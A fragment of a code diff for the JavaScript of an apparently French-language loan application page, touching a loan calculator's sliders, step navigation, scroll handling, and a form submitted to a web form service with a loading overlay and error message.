+        let valD = (durR.value - durR.min) / (durR.max - durR.min) * 100;
+        durR.style.backgroundSize = valD + '% 100%';
     }
-
-    window.onload = () => { renderReviews(); calc(); };
-    amtR.oninput = calc; durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
     function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
     function resetAll() { location.reload(); }
 
+    amtR.oninput = calc; durR.oninput = calc;
+    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
+    calc();
+
+    // --- ENVOI DU FORMULAIRE ---
     const form = document.getElementById('loanForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
-        document.getElementById('loader-overlay').style.display = 'flex';
+        const overlay = document.getElementById('loader-overlay');
+        overlay.style.display = 'flex';
         const formData = new FormData(form);
         try {
             await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
@@ -423,7 +532,7 @@
                 document.getElementById('loading-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
             }, 4000);
-        } catch (error) { alert("Erreur réseau."); document.getElementById('loader-overlay').style.display = 'none'; }
+        } catch (error) { overlay.style.display = 'none'; alert("Erreur réseau. Veuillez réessayer."); }
     };
 </script>
 </body>
